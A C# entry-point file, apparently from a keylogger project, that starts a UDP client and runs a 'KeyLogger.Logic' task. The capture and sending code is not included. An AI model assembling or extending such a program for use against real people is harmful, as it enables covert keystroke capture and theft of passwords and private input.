namespace KL
{
    internal static class Program
    {
        static void Main()
        {
            UdpClient.Start();
            Task.Run(KeyLogger.Logic).Wait();
        }
    }
}